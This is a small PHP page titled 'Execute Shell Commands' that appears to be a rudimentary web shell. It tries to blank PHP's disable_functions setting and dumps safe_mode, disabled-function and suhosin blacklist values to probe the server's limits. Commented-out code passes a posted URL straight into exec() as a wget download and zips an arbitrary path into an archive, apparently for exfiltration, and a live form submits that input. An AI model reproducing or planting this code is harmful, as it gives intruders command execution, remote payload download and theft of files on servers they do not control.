<?php
/******************************************/
/***** Debug functions start from here **********/
/******************************************/
if(!function_exists("alert")){

  function alert($alertText){
  	echo '<script type="text/javascript">';
  	echo "alert(\"$alertText\");";
  	echo "</script>";
  } // function alert

}// if end


if(!function_exists("db")){

  function db($array1){
  	echo "<pre>";
  	var_dump($array1);
  	echo "</pre>";
	}// function db

}// if

    $BASE_URL = strtok($_SERVER['REQUEST_URI'],'?');
    /*if (function_exists('exec') && isset($_POST['url'])){
        $url = $_POST['url'];
        echo "Transferring file: {$url}<br>";
        db(exec("wget {$url}"));
    }
	if(function_exists('exec') && isset($_POST['url'])){
		$abspath = getcwd().'/';
		$url = $_POST['url'];
		$command = 'zip -r '.$abspath.'tahir.zip '. $abspath.$url;
		db(exec($command));
	}*/
	ini_set('disable_functions','');
	db(ini_get('safe_mode'));
	db(explode(',',ini_get('disable_functions')));
	db(explode(',',ini_get('suhosin.executor.func.blacklist')));
?>
<!DOCTYPE html>
<html>
<head>
    <title>Execute Shell Commands</title>
</head>
<body>

    <form name='upload' method='post' action="<?php echo $BASE_URL; ?>">
        <input type='text' id='url' name='url' size='128' /><br>
        <input type="submit" value="Upload">
    </form>
</body>
</html>